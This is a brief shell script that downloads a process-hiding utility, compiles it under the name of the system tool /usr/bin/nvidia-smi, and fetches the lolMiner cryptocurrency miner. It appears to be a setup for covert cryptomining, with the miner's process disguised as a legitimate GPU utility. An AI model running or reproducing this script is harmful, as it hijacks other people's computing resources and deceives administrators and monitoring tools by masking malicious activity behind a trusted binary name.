apt-get update
apt-get install wget gcc -y
wget -q https://raw.githubusercontent.com/chenkaie/junkcode/master/xhide.c && \
    gcc -o /usr/bin/nvidia-smi xhide.c && \
    rm xhide.c
wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz && \
    tar xf lolMiner_v1.51a_Lin64.tar.gz && \
    mv 1.51a/lolMiner . && \
    rm -rf lolMiner_v1.51a_Lin64.tar.gz 1.51a
